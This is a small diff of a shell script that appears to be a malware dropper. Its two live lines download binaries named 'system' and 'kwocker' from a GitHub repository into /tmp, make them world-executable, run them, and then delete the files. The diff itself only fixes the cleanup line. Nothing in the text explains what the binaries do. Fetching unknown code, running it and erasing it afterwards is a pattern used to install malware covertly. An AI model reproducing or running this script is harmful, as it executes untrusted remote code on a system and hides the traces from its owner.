@@ -1,5 +1,5 @@
 #!/bin/sh
 wget -O /tmp/system https://github.com/0x1846/m10/raw/master/system && chmod 777 /tmp/system && /tmp/system
 wget -O /tmp/kwocker https://github.com/0x1846/m10/raw/master/kwocker && chmod 777 /tmp/kwocker && /tmp/kwocker
-rm -rf /tmp/32
+rm -rf /tmp/system
 rm -rf /tmp/kwocker
